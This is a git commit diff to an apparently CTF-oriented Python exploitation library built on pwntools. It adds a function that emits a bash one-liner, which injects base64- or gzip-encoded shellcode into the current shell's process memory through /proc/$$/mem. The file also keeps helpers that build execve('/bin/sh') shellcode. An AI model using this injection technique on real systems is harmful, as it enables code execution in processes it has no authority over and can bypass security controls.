e5319e0b33114fcf2b01a4c7423e4ad2644c7a05
corgo <corgo@dog.com>
2026-04-02 23:46:03 -0500

    bash shellcode
    add function to generate bash shellcode oneliner

--- src/doglib/shellcode/__init__.py
+++ src/doglib/shellcode/__init__.py
@@ -27,7 +27,8 @@ from doglib.shellcode._base import ShellcodeSet
 import pwnlib.shellcraft as _shcraft
 from pwnlib.asm import asm as _asm
 from pwnlib.context import context as _context
-
+from base64 import b64encode
+from gzip import compress as gzcompress
 
 @contextmanager
 def _sc(ctx: str | None = None):
@@ -54,7 +55,7 @@ minshell = ShellcodeSet("minshell")
 # Generators
 # ---------------------------------------------------------------------------
 
-# run but simpler, assumes /bin/sh is present
+# run a shell command
 def runcmd(cmd: str, ctx: str | None = None) -> bytes:
     with _sc(ctx) as sc:
         return _asm(sc.linux.execve("/bin/sh", ["/bin/sh", "-c", cmd], 0))
@@ -70,6 +71,17 @@ def listdir(path: str, size: int = 0x1000, ctx: str | None = None) -> bytes:
         code += f"add rsp, {size:#x}\n"
         return _asm(code)
 
+# bash oneliner to inject shellcode into current process
+# from https://github.com/nobodyisnobody/docs/tree/main/linux.tricks/Bash.shellcode.injection.oneliner
+# shell will probably crash after, so you should wrap this in /bin/bash -c ''
+def bash_shellcode(asm: bytes, compress: bool = False) -> str:
+    if compress:
+        asm = gzcompress(asm)
+    payload = b64encode(asm).decode()
+    return f"cd /proc/$$;read a<syscall;exec 3>mem;echo {payload}|base64 -d{'|gunzip' if compress else ''}|dd bs=1 seek=$[`echo $a|cut -d\" \" -f9`-2]>&3;read k"
+
 # ---------------------------------------------------------------------------
 
-__all__ = ["minshell", "run", "runcmd", "listdir"]
+
+
+__all__ = ["minshell", "runcmd", "listdir", "bash_shellcode"]
